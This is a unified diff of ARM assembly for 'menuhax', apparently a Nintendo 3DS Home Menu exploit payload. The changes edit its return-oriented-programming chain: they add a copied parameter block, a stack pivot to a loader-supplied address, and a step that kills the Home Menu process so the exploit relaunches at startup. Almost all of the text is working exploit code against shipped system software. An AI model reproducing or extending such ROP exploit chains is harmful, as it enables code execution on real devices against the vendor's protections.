@@ -7,15 +7,23 @@
 #include "menuhax_ropinclude.s"
 
 _start:
+
+ropstackstart:
+
 .word POP_R2R6PC
-ret2menu_exploitreturn_spaddr: @ The menuhax_loader writes the sp-addr to jump to for ret2menu here.
+menuhaxpayload_inparamblk:
+@ The menuhax_loader writes the sp-addr to jump to for ret2menu here.
 .word 0 @ r2
+@ SP-addr to jump to right before the menuhax-thread restarts the Home Menu process. Setup by menuhax_loader.
 .word 0 @ r3
-.word 0 @ r4
+@ Address that stage1 will jump to from beforethreadexit_spaddr once it's finished.
+.word NEWTHREAD_ROPBUFFER + (newthread_exitrop - newthread_ropstart) @ r4
 .word 0 @ r5
 .word 0 @ r6
 
-ropstackstart:
+@ Copy the above paramblk to menuhaxpayload_paramblk, since the above data will get corrupted by ROP.
+CALLFUNC_NOSP MEMCPY, ROPBUFLOC(menuhaxpayload_paramblk), ROPBUFLOC(menuhaxpayload_inparamblk), 0x10, 0
+
 #ifdef LOADSDCFG
 @ Load the cfg file. Errors are ignored with file-reading.
 CALLFUNC_NOSP MEMSET32_OTHER, ROPBUFLOC(IFile_ctx), 0x20, 0, 0
@@ -388,6 +396,17 @@ CALLFUNC IFile_Write, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ro
 
 ROPMACRO_IFile_Close (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart))
 
+@ Copy the addr from beforethreadexit_spaddr to the word which will be popped into sp.
+ROPMACRO_COPYWORD NEWTHREAD_ROPBUFFER + (newthread_rop_stackpivot_sploadword - newthread_ropstart), ROPBUFLOC(beforethreadexit_spaddr)
+
+@ Write to the word which will be popped into pc.
+ROPMACRO_WRITEWORD NEWTHREAD_ROPBUFFER + (newthread_rop_stackpivot_pcloadword - newthread_ropstart), ROP_POPPC
+
+ROPMACRO_STACKPIVOT_PREPAREREGS_BEFOREJUMP_NEWTHREAD
+
+ROPMACRO_STACKPIVOT_JUMP
+
+newthread_exitrop:
 .word MAINLR_SVCEXITPROCESS @ Cause homemenu to terminate, which then results in menuhax automatically launching during homemenu startup.
 
 newthread_object:
@@ -588,6 +607,15 @@ menuhax_cfg_new:
 ropkit_cmpobject:
 .word (ROPBUFLOC(ropkit_cmpobject) + 0x4) @ Vtable-ptr
 .fill (0x40 / 4), 4, STACKPIVOT_ADR @ Vtable
+
+menuhaxpayload_paramblk: @ Copy of the data near _start.
+ret2menu_exploitreturn_spaddr: @ The menuhax_loader writes the sp-addr to jump to for ret2menu here.
+.word 0
+beforethreadexit_spaddr: @ SP-addr to jump to right before the menuhax-thread restarts the Home Menu process. Setup by menuhax_loader.
+.word 0
+beforethreadexit_return_spaddr: @ Address that stage1 will jump to from beforethreadexit_spaddr once it's finished.
+.word 0
+.word 0
 
 tmp_scratchdata:
 .space 0x20
